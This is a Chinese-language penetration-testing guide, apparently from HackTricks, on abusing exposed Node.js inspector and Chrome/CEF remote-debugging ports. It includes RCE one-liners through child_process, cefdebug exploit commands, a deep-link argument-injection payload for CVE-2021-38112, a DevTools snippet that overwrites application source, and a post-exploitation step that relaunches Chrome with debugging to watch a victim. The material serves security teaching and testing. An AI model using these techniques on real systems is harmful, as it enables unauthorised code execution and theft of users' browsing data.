# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

[根据文档](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started)：使用 `--inspect` 开关启动时，Node.js 进程会监听 debugging client。**默认情况下**，它会监听主机和端口 **`127.0.0.1:9229`**。每个进程还会被分配一个**唯一的** **UUID**。

Inspector clients 必须知道并指定主机地址、端口和 UUID 才能连接。完整 URL 类似于 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。

> [!WARNING]
> 由于 **debugger 可以完全访问 Node.js 的执行环境**，能够连接到此端口的恶意攻击者可能可以代表 Node.js 进程执行任意代码（**潜在的权限提升**）。

启动 inspector 有多种方式：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
当你启动一个经过检查的进程时，可能会出现类似以下内容：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
基于 **CEF**（**Chromium Embedded Framework**）的进程需要使用参数：`--remote-debugging-port=9222` 来开启 **debugger**（SSRF 防护措施仍然非常相似）。不过，它们不会授予 **NodeJS** **debug** 会话，而是通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 与浏览器通信。这是一个用于控制浏览器的接口，但不存在直接的 RCE。

当你启动一个启用了 debug 的浏览器时，会出现类似以下内容：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers、WebSockets 和 same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在 web-browser 中打开的网站可以在浏览器安全模型下发起 WebSocket 和 HTTP 请求。必须建立**初始 HTTP 连接**，才能**获取唯一的 debugger session id**。**same-origin-policy** **阻止**网站建立**此 HTTP 连接**。为进一步防御 [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**，**Node.js 会验证连接的 **'Host' headers** 是否精确指定了**IP address**、**`localhost`** 或 **`localhost6`**。

> [!TIP]
> 这些**安全措施可防止通过仅**发送 HTTP request 来利用 inspector 执行代码（这可以通过利用 SSRF vuln 实现）。

### 在运行中的进程内启动 inspector

你可以向正在运行的 nodejs 进程发送 **signal SIGUSR1**，使其在默认端口启动 **inspector**。但是请注意，你需要拥有足够的权限，因此这可能会授予你对进程内部信息的**特权访问**，但不会直接实现 privilege escalation。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> 这在 containers 中很有用，因为使用 `--inspect` **关闭进程并启动新进程** **不是可行选项**，因为 **container** 会随进程一起被 **kill**。

### 连接到 inspector/debugger

要连接到基于 **Chromium** 的 browser，可以分别访问 Chrome 或 Edge 的 `chrome://inspect` 或 `edge://inspect` URL。点击 Configure 按钮后，应确保其中正确列出了 **target host 和 port**。下图展示了一个 Remote Code Execution (RCE) 示例：

![访问 debugger 的 URL 将会出现，例如 ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - 连接到 inspector/debugger：要连接到基于 Chromium 的 browser，...](<../../images/image (674).png>)

使用 **命令行**，可以通过以下方式连接到 debugger/inspector：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 可以**查找本地运行的 inspectors**，并向其中**注入代码**。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> 请注意，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器，**NodeJS RCE exploits** 将无法运行（你需要检查 API，以找到可以利用它执行的有趣操作）。

## NodeJS Debugger/Inspector 中的 RCE

> [!TIP]
> 如果你来到这里是想了解如何[**从 Electron 中的 XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

当你可以连接到 Node **inspector** 时，获取 **RCE** 的一些常见方法是使用类似以下的方式（看起来这在连接到 Chrome DevTools protocol 时**无法正常工作**）：
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

你可以在这里查看 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
在本节中，我只会列出我发现有人利用此 protocol 的一些有趣方式。

### Parameter Injection via Deep Links

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino security 发现，一个基于 CEF 的应用程序在系统中**注册了自定义 UR**I（workspaces://index.html），该 URI 会接收完整的 URI，随后使用一个由该 URI 部分构造的配置来**启动基于 CEF 的应用程序**。

研究人员发现，URI 参数会经过 URL 解码，并被用于启动 CEF 基础应用程序，从而允许用户在**命令行**中**注入** **`--gpu-launcher`** flag 并执行任意操作。

因此，payload 如下：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
将执行 calc.exe。

### 覆盖文件

更改**下载文件的保存目录**，然后下载文件，使用你的**恶意代码**覆盖应用程序中经常使用的**源代码**。
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE 与 exfiltration

根据这篇文章：[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以从 theriver 获取 RCE 并 exfiltrate 内部页面。

### Post-Exploitation

在真实环境中，**compromising** 一台使用基于 Chrome/Chromium 浏览器的用户 PC **之后**，你可以启动一个 **启用 debugging 并将 debugging 端口进行 port-forward 的 Chrome 进程**，从而访问它。这样，你就能够 **检查受害者使用 Chrome 执行的所有操作，并窃取敏感信息**。

隐蔽的方式是 **终止所有 Chrome 进程**，然后调用类似以下内容的命令
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考资料

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
